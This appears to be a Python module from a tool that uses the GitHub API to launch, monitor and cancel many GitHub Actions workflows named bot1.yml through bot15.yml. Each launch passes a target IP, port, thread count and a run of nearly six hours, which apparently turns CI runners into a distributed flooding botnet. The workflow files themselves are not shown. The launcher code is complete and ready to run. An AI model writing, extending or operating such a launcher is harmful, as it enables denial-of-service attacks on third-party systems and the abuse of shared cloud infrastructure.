# services/github.py
import requests
import time
import logging
from database import get_github_config

logger = logging.getLogger(__name__)

def trigger_workflow(workflow_file, ip, port, threads, duration=21000):
    """Single workflow trigger করো"""
    cfg = get_github_config()
    if not cfg.get("token") or not cfg.get("repo"):
        logger.error("GitHub token/repo not configured")
        return False

    url = f"https://api.github.com/repos/{cfg['repo']}/actions/workflows/{workflow_file}/dispatches"
    headers = {
        "Authorization": f"Bearer {cfg['token']}",
        "Accept": "application/vnd.github+json"
    }
    data = {
        "ref": "main",
        "inputs": {
            "target_ip": str(ip),
            "target_port": str(port),
            "threads": str(threads),
            "duration": str(duration)
        }
    }

    try:
        r = requests.post(url, headers=headers, json=data, timeout=10)
        if r.status_code == 204:
            return True
        else:
            logger.error(f"Trigger {workflow_file} failed: {r.status_code} {r.text[:100]}")
            return False
    except Exception as e:
        logger.error(f"Trigger {workflow_file} exception: {e}")
        return False

def launch_all(ip, port, threads, duration=21000):
    """সব configured workflow চালাও"""
    cfg = get_github_config()
    count = cfg.get("count", 15)
    success = 0
    for i in range(1, count + 1):
        if trigger_workflow(f"bot{i}.yml", ip, port, threads, duration):
            success += 1
        time.sleep(0.5)  # rate limit এড়াতে
    logger.info(f"launch_all: {success}/{count} triggered")
    return success

def cancel_all():
    """সব in_progress workflow cancel করো"""
    cfg = get_github_config()
    if not cfg.get("token") or not cfg.get("repo"):
        return 0

    headers = {"Authorization": f"Bearer {cfg['token']}",
               "Accept": "application/vnd.github+json"}
    url = f"https://api.github.com/repos/{cfg['repo']}/actions/runs?status=in_progress&per_page=100"

    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code != 200:
            return 0
        cancelled = 0
        for run in r.json().get("workflow_runs", []):
            cancel_url = f"https://api.github.com/repos/{cfg['repo']}/actions/runs/{run['id']}/cancel"
            resp = requests.post(cancel_url, headers=headers, timeout=10)
            if resp.status_code in [202, 204]:
                cancelled += 1
        return cancelled
    except Exception as e:
        logger.error(f"cancel_all error: {e}")
        return 0

def get_all_runs():
    """সব workflow এর latest status নাও"""
    cfg = get_github_config()
    if not cfg.get("token") or not cfg.get("repo"):
        return {}

    headers = {"Authorization": f"Bearer {cfg['token']}",
               "Accept": "application/vnd.github+json"}
    url = f"https://api.github.com/repos/{cfg['repo']}/actions/runs?per_page=100"

    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code != 200:
            logger.error(f"get_all_runs: {r.status_code}")
            return {}
        result = {}
        for run in r.json().get("workflow_runs", []):
            path = run.get("path", "").split("/")[-1]
            if path and path not in result:
                result[path] = run["status"]
        return result
    except Exception as e:
        logger.error(f"get_all_runs error: {e}")
        return {}

def test_connection():
    """GitHub token ও repo valid কিনা check করো"""
    cfg = get_github_config()
    if not cfg.get("token") or not cfg.get("repo"):
        return False
    try:
        r = requests.get(
            f"https://api.github.com/repos/{cfg['repo']}",
            headers={"Authorization": f"Bearer {cfg['token']}",
                     "Accept": "application/vnd.github+json"},
            timeout=10
        )
        return r.status_code == 200
    except Exception as e:
        logger.error(f"test_connection error: {e}")
        return False

def get_rate_limit():
    """GitHub rate limit status নাও"""
    cfg = get_github_config()
    try:
        r = requests.get(
            "https://api.github.com/rate_limit",
            headers={"Authorization": f"Bearer {cfg['token']}"},
            timeout=10
        )
        return r.json() if r.status_code == 200 else None
    except:
        return None
